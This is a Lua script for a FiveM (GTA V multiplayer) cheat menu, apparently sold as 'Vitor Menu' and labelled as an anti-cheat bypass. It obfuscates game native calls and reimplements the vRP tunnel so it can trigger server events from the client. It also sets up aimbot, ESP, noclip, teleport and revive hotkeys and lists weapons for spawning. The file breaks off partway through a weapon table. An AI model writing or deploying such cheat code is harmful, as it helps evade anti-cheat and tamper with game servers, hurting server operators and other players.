---anticheatbypass---
vitolasRPMQCUeMEUCU = {}
vitolasRPMQCUeMEUCU.debug = admgordolas
local Enabled = vitolasRPMQCUeMEUCUzz
local logged = admgordolas

local menus = {}
local optionCount = 0
local currentKey = vitolasRPMQCUeMEUCUss
local currentMenu = vitolasRPMQCUeMEUCUss
local titleHeight = 1.20
local titleXOffset = 1.10
local titleSpacing = 2
local titleYOffset = 0.03
local titleScale = 1.0
local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005
local currentItemIndex = 1
local selectedItemIndex = 1
local allWeapons={"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}
vitolasRPMQCUeMEUCUww = TriggerServerEvent
vitolasRPMQCUeMEUCUff = GetHashKey
vitolasRPMQCUeMEUCUss = nil
admgordolas = false
vitolasRPMQCUeMEUCUzz = true
vitolasRPMQCUeMEUCUtt = Wait
admmeupau = math
vitolasRPMQCUeMEUCUgg = DisableControlAction
vitolasRPMQCUeMEUCUyy = DrawText
vitolasRPMQCUeMEUCUll = drawTextOutline
vitolasRPMQCUeMEUCUuu = DrawRect
local MenuEnabled = vitolasRPMQCUeMEUCUzz
local tab = "MySelf"


local MQCUumaBOSTA = {["Label"] = "MOUSE3",["Value"] = 348}
local MQCUumaBOSTA2 = {["Label"] = "PAGEUP",["Value"] = 10}
local MQCUumaBOSTARP = {["Label"] = "PAGEUP",["Value"] = 10}
local noclip = {["Label"] = "U",["Value"] = 303}
local ReviverRP = {["Label"] = "INSERT",["Value"] = 121}

menucolor = { r = 255, g = 0, b = 0 }
corzinhadomeni = { r = 255, g = 0, b = 0 }
magneto_cor = { r = 255, g = 0, b = 0 }
visuals_aimlock = {value = 0.05, max = 9.99, min = 0.1}
visuals_distance = {value = 150, max = 999, min = 0}
esp_skel_cor = {r = 255, g = 255, b = 255}
esp_box_cor = {r = 255, g = 255, b = 255}
esp_nome_cor = {r = 255, g = 255, b = 255}
esp_veiculo_cor = {r = 255, g = 255, b = 255}

    local penis = vitolasRPMQCUeMEUCUzz
    Tunnel = {}
    local function tunnel_resolve(itable, key)
        local mtable = getmetatable(itable)
        local iname = mtable.name
        local ids = mtable.tunnel_ids
        local callbacks = mtable.tunnel_callbacks
        local identifier = mtable.identifier
        local fcall = function(args, callback)
            if args == vitolasRPMQCUeMEUCUss then
                args = {}
            end
            if type(callback) == "function" then
                local rid = ids:gen()
                callbacks[rid] = callback
                vitolasRPMQCUeMEUCUww(iname .. ":tunnel_req", key, args, identifier, rid)
            else
                vitolasRPMQCUeMEUCUww(iname .. ":tunnel_req", key, args, "", -1)
            end
        end
        itable[key] = fcall
        return fcall
    end
    function Tunnel.bindInterface(name, interface)
        RegisterNetEvent(name .. ":tunnel_req")
        AddEventHandler(name .. ":tunnel_req", function(member, args, identifier, rid)
            local f = interface[member]
            local delayed = admgordolas
            local rets = {}
            if type(f) == "function" then
                TUNNEL_DELAYED = function()
                    delayed = vitolasRPMQCUeMEUCUzz
                    return function(rets)
                        rets = rets or {}
                        if rid >= 0 then
                            vitolasRPMQCUeMEUCUww(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
                        end
                    end
                end
                rets = {f(table.unpack(args))}
            end
            if not delayed and rid >= 0 then
                vitolasRPMQCUeMEUCUww(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
            end
        end)
    end

    function drawTextOutline(text, x, y, scale, font, outline, center, r, g, b)
        SetTextScale(0.0, scale)
        SetTextFont(font)
        if outline then
            SetTextOutline(outline)
        else
        end
        SetTextCentre(center)
        SetTextColour(esp_veiculo_cor.r, esp_veiculo_cor.g, esp_veiculo_cor.b, 255)
        BeginTextCommandDisplayText("TWOSTRINGS")
        AddTextComponentString(text)
        EndTextCommandDisplayText(x, y - 0.011)
    end

    function Tunnel.getInterface(name, identifier)
        local ids = Tools.newIDGenerator()
        local callbacks = {}
        local r = setmetatable({}, {
            index = tunnel_resolve,
            name = name,
            tunnel_ids = ids,
            tunnel_callbacks = callbacks,
            identifier = identifier
        })
        RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")
        AddEventHandler(name .. ":" .. identifier .. ":tunnel_res", function(rid, args)
            local callback = callbacks[rid]
            if callback ~= vitolasRPMQCUeMEUCUss then
                ids:free(rid)
                callbacks[rid] = vitolasRPMQCUeMEUCUss
                callback(table.unpack(args))
            end
        end)
        return r
    end
    Proxy = {}
    local proxy_rdata = {}
    local function proxy_callback(rvalues)
        proxy_rdata = rvalues
    end
    local function proxy_resolve(itable, key)
        local iname = getmetatable(itable).name
        local fcall = function(args, callback)
            if args == vitolasRPMQCUeMEUCUss then
                args = {}
            end
            TriggerEvent(iname .. ":proxy", key, args, proxy_callback)
            return table.unpack(proxy_rdata)
        end
        itable[key] = fcall
        return fcall
    end
    function Proxy.addInterface(name, itable)
        AddEventHandler(name .. ":proxy", function(member, args, callback)
            local f = itable[member]
            if type(f) == "function" then
                callback({f(table.unpack(args))})
            else
            end
        end)
    end
    function Proxy.getInterface(name)
        local r = setmetatable({}, {
            index = proxy_resolve,
            name = name
        })
        return r
    end
    vRP = Proxy.getInterface("vRP")
    --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- FUNÇAO vRP
local uuuids = GetActivePlayers()
local function DCamDirection() local saoiduhp = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId()) local fpojds = GetGameplayCamRelativePitch() local x = -admmeupau.sin(saoiduhp * admmeupau.pi / 180.0) local y = admmeupau.cos(saoiduhp * admmeupau.pi / 180.0) local z = admmeupau.sin(fpojds * admmeupau.pi / 180.0) local len = admmeupau.sqrt(x * x + y * y + z * z) if len ~= 0 then x = x / len y = y / len z = z / len end  return x, y, z end


local currAimbotBoneIndex = 1
local selAimbotBoneIndex = 1
local WM = {
    Menu = {
        MenuX = 0.68,
        MenuY = 0.5,
    }
}

local to_add_X = WM.Menu.MenuX-0.5
local to_add_Y = WM.Menu.MenuY-0.5




local playerlist = GetActivePlayers()
    local hash = GetEntityModel(GetPlayerPed(SelectedPlayer))
    local lmao = "M"
    if hash == `mp_f_freemode_01` then
        lmao = "F"
    elseif hash == `mp_f_freemode_01` then
        lmao = "M"
    else
        lmao = "N"
    end
    if SelectedPlayer == vitolasRPMQCUeMEUCUss then
        SelectedPlayer = playerlist[1]
    end
  for i = 1, #playerlist do
        local currPlayer = playerlist[i]
        
        end

local function text3(name,outline,size,Justification,xx,yy)

    if outline then SetTextOutline() end

    SetTextScale(0.00,size)

    SetTextColour(255, 255, 255, 255)

    SetTextFont(10)

    SetTextProportional(0)

    SetTextJustification(Justification)

    SetTextEntry("string")

    AddTextComponentString(name)

    vitolasRPMQCUeMEUCUyy(xx,yy)

end
local invokenative = Citizen.InvokeNative

local InvokeNativeGowno_IDYHGIUSDGSDFG = invokenative

local function Citizen_InvokeNative(invoke, ...)
    return InvokeNativeGowno_IDYHGIUSDGSDFG(invoke, ...)
end
local DSUFYSIDUGYSUDYSIDGSDG = {}
local DSUIGYDSIUGYUDSIGSDG = Citizen_InvokeNative(0xF1307EF624A80D87, vitolasRPMQCUeMEUCUzz, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
local AYSTRYATUFYSDFSDG = 10^3

local function manacokkk(name,outline,xx,yy)
    text3(name, outline, 0.27, 0, xx, yy - 0.012)
    local x, y = GetNuiCursorPosition()
    local x_res, y_res = GetActiveScreenResolution()
    if
        ((x / x_res) + 0.02 >= xx and (x / x_res) - 0.035 <= xx and (y / y_res) + 0.015 >= yy and
            (y / y_res) - 0.015 <= yy)
     then
        vitolasRPMQCUeMEUCUuu(xx, yy, 0.10, 0.031, 30, 30, 30, 255)
        if IsDisabledControlJustReleased(0, 92) then
            return vitolasRPMQCUeMEUCUzz
        end
    else
        vitolasRPMQCUeMEUCUuu(xx, yy, 0.10, 0.031, 30, 30, 30, 255)
        return admgordolas
    end
end

print("Carregando Sistema HWID...\nObrigado por Adquirir ^1Vitor Menu^0 | ^1Vitor RP^0 melhor do ^2FiveM^0 :)\n\nMeu  Canal: ^1youtube.com/VitorRP^0\nMeu Discord: ^4discord.gg/vitorrp^0\n\n^3MOUSE3 (Scroll do Mouse):^0 abre o menu \n^3Tecla U:^0 Ativa Noclip (Funciona dentro do carro) \n^3Tecla F4:^0 Teleporta para o local marcado no mapa \n^3Tecla INSERT:^0 Revive \n^3Tecla DELETE:^0 Repara/Desvira Veiculo")

local keys = {
    ["ESC"] = 322,
    ["NENHUM"] = 0,
    ["F1"] = 288,
    ["F2"] = 289,
    ["F3"] = 170,
    ["F5"] = 166,
    ["F6"] = 167,
    ["F7"] = 168,
    ["F8"] = 169,
    ["F9"] = 56,
    ["F10"] = 57,
    ["~"] = 243,
    ["1"] = 157,
    ["2"] = 158,
    ["3"] = 160,
    ["4"] = 164,
    ["5"] = 165,
    ["6"] = 159,
    ["7"] = 161,
    ["8"] = 162,
    ["9"] = 163,
    ["-"] = 84,
    ["="] = 83,
    ["BACKSPACE"] = 177,
    ["TAB"] = 37,
    ["Q"] = 44,
    ["W"] = 32,
    ["E"] = 38,
    ["R"] = 45,
    ["T"] = 245,
    ["Y"] = 246,
    ["U"] = 303,
    ["P"] = 199,
    ["["] = 39,
    ["]"] = 40,
    ["ENTER"] = 18,
    ["CAPS"] = 137,
    ["A"] = 34,
    ["S"] = 8,
    ["D"] = 9,
    ["F"] = 23,
    ["G"] = 47,
    ["H"] = 74,
    ["K"] = 311,
    ["L"] = 182,
    ["LEFTSHIFT"] = 21,
    ["Z"] = 20,
    ["X"] = 73,
    ["C"] = 26,
    ["V"] = 0,
    ["B"] = 29,
    ["N"] = 249,
    ["M"] = 244,
    [","] = 82,
    ["."] = 81,
    ["LEFTCTRL"] = 36,
    ["LEFTALT"] = 19,
    ["SPACE"] = 22,
    ["RIGHTCTRL"] = 70,
    ["HOME"] = 213,
    ["PAGEUP"] = 10,
    ["PAGEDOWN"] = 11,
    ["DELETE"] = 178,
    ["INSERT"] = 121,
    ["LEFT"] = 174,
    ["RIGHT"] = 175,
    ["UP"] = 172,
    ["DOWN"] = 173,
    ["NENTER"] = 201,
    ["MWHEELUP"] = 15,
    ["MWHEELDOWN"] = 14,
    ["LEFTSHIFT/N8"] = 61,
    ["N4"] = 108,
    ["N5"] = 60,
    ["N6"] = 107,
    ["N+"] = 96,
    ["N-"] = 97,
    ["N7"] = 117,
    ["N9"] = 118,
    ["MOUSE1"] = 24,
    ["MOUSE2"] = 25,
    ["MOUSE3"] = 348
}


local t_Weapons = {

    -- Melee Weapons
    {'WEAPON_BAT', "Baseball Bat", "weapon_bat", "weapon_icons", "melee"},
    {'WEAPON_BATTLEAXE', "Battleaxe", "w_me_fireaxe", "mpweaponsunusedfornow", "melee"},
    {'WEAPON_BOTTLE', "Broken Bottle", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "melee"},
    {'WEAPON_CROWBAR', "Crowbar", "w_me_crowbar", "mpweaponsunusedfornow", "melee"},
    {'WEAPON_DAGGER', "Antique Cavalry Dagger", "weapon_dagger", "weapon_icons", "melee"},
    {'WEAPON_FLASHLIGHT', "Flashlight", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "melee"},
    {'WEAPON_GOLFCLUB', "Golf Club", "w_me_gclub", "mpweaponsunusedfornow", "melee"},
    {'WEAPON_HAMMER', "Hammer", "w_me_hammer", "mpweaponsunusedfornow", "melee"},
    {'WEAPON_HATCHET', "Hatchet", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "melee"},
    {'WEAPON_KNIFE', "Knife", "weapon_knife", "weapon_icons", "melee"},
    {'WEAPON_KNUCKLE', "Brass Knuckles", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "melee"},
    {'WEAPON_MACHETE', "Machete", "weapon_machete", 'weapon_icons', "melee"},
    {'WEAPON_NIGHTSTICK', "Nightstick", "w_me_nightstick", "mpweaponsunusedfornow", "melee"},
    {'WEAPON_POOLCUE', "Pool Cue", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "melee"},
    {'WEAPON_STONE_HATCHET', "Stone Hatchet", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "melee"},
    {'WEAPON_SWITCHBLADE', "Switchblade", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "melee"},
    {'WEAPON_WRENCH', "Wrench", "w_me_wrench", "mpweaponsunusedfornow", "melee"},
    
    -- Handguns
    {'WEAPON_PISTOL', "Pistol", "w_pi_pistol", "mpweaponsgang1_small", "handguns", vitolasRPMQCUeMEUCUzz},
    {'WEAPON_COMBATPISTOL', "Combat Pistol", "w_pi_combatpistol", "mpweaponscommon_small", "handguns"},
    {'WEAPON_APPISTOL', "AP Pistol", "w_pi_apppistol", "mpweaponsgang1_small", "handguns"},
    {'WEAPON_STUNGUN', "Stungun", "w_pi_stungun", "mpweaponsgang0_small", "handguns"},
    {'WEAPON_PISTOL50', "Pistol .50", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},
    {'WEAPON_SNSPISTOL', "SNS Pistol", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns", vitolasRPMQCUeMEUCUzz},
    {'WEAPON_HEAVYPISTOL', "Heavy Pistol", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},
    {'WEAPON_VINTAGEPISTOL', "Vintage Pistol", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},
    {'WEAPON_FLAREGUN', "Flare Gun", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},
    {'WEAPON_MARKSMANPISTOL', "Marksman Pistol", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},
    {'WEAPON_REVOLVER', "Heavy Revolver", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns", vitolasRPMQCUeMEUCUzz},
    {'WEAPON_DOUBLEACTION', "Double Action Revolver", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},
    {'WEAPON_RAYPISTOL', "Up-n-Atomizer", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},
    {'WEAPON_CERAMICPISTOL', "Ceramic Pistol", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},
    {'WEAPON_NAVYREVOLVER', "Navy Revolver", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "handguns"},

    -- SMGs
    {'WEAPON_MICROSMG', "Micro SMG", "w_sb_microsmg", "mpweaponscommon_small", "smgs"},
    {'WEAPON_SMG', "SMG", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "smgs", vitolasRPMQCUeMEUCUzz},
    {'WEAPON_ASSAULTSMG',"Assault SMG", "w_sb_assaultsmg", "mpweaponscommon_small", "smgs"},
    {'WEAPON_COMBATPDW', "Combat PDW", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "smgs"},
    {'weapon_machinepistol', "Machine Pistol", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "smgs"},
    {'weapon_minismg', "Mini SMG", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "smgs"},
    {'weapon_raycarbine', "Unholy Hellbringer", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "smgs"},
    
    -- Shotguns
    {'WEAPON_PUMPSHOTGUN', "Pump Shotgun", "w_sg_pumpshotgun", "mpweaponscommon_small", "shotguns", vitolasRPMQCUeMEUCUzz},
    {'WEAPON_SAWNOFFSHOTGUN', "Sawed-Off Shotgun", "w_sg_sawnoff", "mpweaponsgang1", "shotguns"},
    {'WEAPON_ASSAULTSHOTGUN', "Assault Shotgun", "w_sg_assaultshotgun", "mpweaponscommon_small", "shotguns"},
    {'weapon_bullpupshotgun', "Bullpup Shotgun", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "shotguns"},
    {'weapon_musket', "Musket", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "shotguns"},
    {'weapon_heavyshotgun', "Heavy Shotgun", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "shotguns"},
    {'weapon_dbshotgun', "Double Barrel Shotgun", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "shotguns"},
    {'weapon_autoshotgun', "Sweeper Shotgun", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "shotguns"},

    -- Assault Rifles
    {'WEAPON_ASSAULTRIFLE', "Assault Rifle", "w_ar_assaultrifle", "mpweaponsgang1_small", "assaultrifles", vitolasRPMQCUeMEUCUzz},
    {'weapon_carbinerifle', "Carbine Rifle", "w_ar_carbinerifle", "mpweaponsgang0_small", "assaultrifles", vitolasRPMQCUeMEUCUzz},
    {'weapon_advancedrifle', "Advanced Rifle", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "assaultrifles"},
    {'weapon_specialcarbine', "Special Carbine", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "assaultrifles", vitolasRPMQCUeMEUCUzz},
    {'weapon_bullpuprifle', "Bullpup Rifle", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "assaultrifles", vitolasRPMQCUeMEUCUzz},
    {'weapon_compactrifle', "Compact Rifle", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "assaultrifles"},

    -- LMGs
    {'weapon_mg', "MG", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "lmgs"},
    {'weapon_combatmg', "Combat MG", "w_mg_combatmg", "mpweaponsgang0_small", "lmgs", vitolasRPMQCUeMEUCUzz},
    {'weapon_gusenburg', "Gusenberg Sweeper", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "lmgs"},

    -- Sniper Rifles
    {'WEAPON_SNIPERRIFLE', "Sniper Rifle", "w_sr_sniperrifle", "mpweaponsgang0_small", "sniperrifles"},
    {'WEAPON_HEAVYSNIPER', "Heavy Sniper", "w_sr_heavysniper", "mpweaponsgang0_small", "sniperrifles", vitolasRPMQCUeMEUCUzz},
    {'weapon_marksmanrifle', "Marksman Rifle", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "sniperrifles", vitolasRPMQCUeMEUCUzz},
    -- Heavy Weapons
    {'WEAPON_RPG', "RPG", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"},
    {'WEAPON_GRENADELAUNCHER', "Grenade Launcher", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"},
    {'weapon_grenadelauncher_smoke', "Grenade Launcher (Smoke)", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"},
    {'weapon_minigun', "Minigun", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"},
    {'weapon_firework', "Firework Launcher", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"},
    {'weapon_railgun', "Railgun", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"},
    {'weapon_hominglauncher', "Homing Launcher", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"},
    {'weapon_compactlauncher', "Compact Grenade Launcher", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"},
    {'weapon_rayminigun', "Widowmaker", vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, "heavyweapons"}, 
}
local allweapons = {
    "WEAPON_UNARMED",
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    

    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL",
    

    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_RAYPISTOL",
    

    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_RAYCARBINE",
    

    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    

    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    

    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    

    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_RAYMINIGUN",
}

local meleeweapons = {
    {"WEAPON_KNIFE", "Knife"},
    {"WEAPON_KNUCKLE", "Brass Knuckles"},
    {"WEAPON_NIGHTSTICK", "Nightstick"},
    {"WEAPON_HAMMER", "Hammer"},
    {"WEAPON_BAT", "Baseball Bat"},
    {"WEAPON_GOLFCLUB", "Golf Club"},
    {"WEAPON_CROWBAR", "Crowbar"},
    {"WEAPON_BOTTLE", "Bottle"},
    {"WEAPON_DAGGER", "Dagger"},
    {"WEAPON_HATCHET", "Hatchet"},
    {"WEAPON_MACHETE", "Machete"},
    {"WEAPON_FLASHLIGHT", "Flashlight"},
    {"WEAPON_SWITCHBLADE", "Switchblade"},
    {"WEAPON_POOLCUE", "Pool Cue"},
    {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
}

local thrownweapons = {
    {"WEAPON_GRENADE", "Grenade"},
    {"WEAPON_STICKYBOMB", "Sticky Bomb"},
    {"WEAPON_PROXMINE", "Proximity Mine"},
    {"WEAPON_BZGAS", "BZ Gas"},
    {"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
    {"WEAPON_MOLOTOV", "Molotov"},
    {"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
    {"WEAPON_PETROLCAN", "Fuel Can"},
    {"WEAPON_SNOWBALL", "Snowball"},
    {"WEAPON_FLARE", "Flare"},
    {"WEAPON_BALL", "Baseball"}
}

local pistolweapons = {
    {"WEAPON_PISTOL", "Pistol"},
    {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
    {"WEAPON_COMBATPISTOL", "Combat Pistol"},
    {"WEAPON_APPISTOL", "AP Pistol"},
    {"WEAPON_REVOLVER", "Revolver"},
    {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
    {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
    {"WEAPON_PISTOL50", "Pistol .50"},
    {"WEAPON_SNSPISTOL", "SNS Pistol"},
    {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
    {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
    {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
    {"WEAPON_STUNGUN", "Tazer"},
    {"WEAPON_FLAREGUN", "Flaregun"},
    {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
}

local smgweapons = {
    {"WEAPON_MICROSMG", "Micro SMG"},
    {"WEAPON_MINISMG", "Mini SMG"},
    {"WEAPON_SMG", "SMG"},
    {"WEAPON_SMG_MK2", "SMG Mk II"},
    {"WEAPON_ASSAULTSMG", "Assault SMG"},
    {"WEAPON_COMBATPDW", "Combat PDW"},
    {"WEAPON_GUSENBERG", "Gunsenberg"},
    {"WEAPON_MACHINEPISTOL", "Machine Pistol"},
    {"WEAPON_MG", "MG"},
    {"WEAPON_COMBATMG", "Combat MG"},
    {"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
    {"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
}

local assaultweapons = {
    {"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
    {"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
    {"WEAPON_CARBINERIFLE", "Carbine Rifle"},
    {"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
    {"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
    {"WEAPON_SPECIALCARBINE", "Special Carbine"},
    {"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
    {"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
    {"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
    {"WEAPON_COMPACTRIFLE", "Compact Rifle"}
}

local shotgunweapons = {
    {"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
    {"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
    {"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
    {"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
    {"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
    {"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
    {"WEAPON_MUSKET", "Musket"},
    {"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
    {"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
}

local sniperweapons = {
    {"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
    {"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
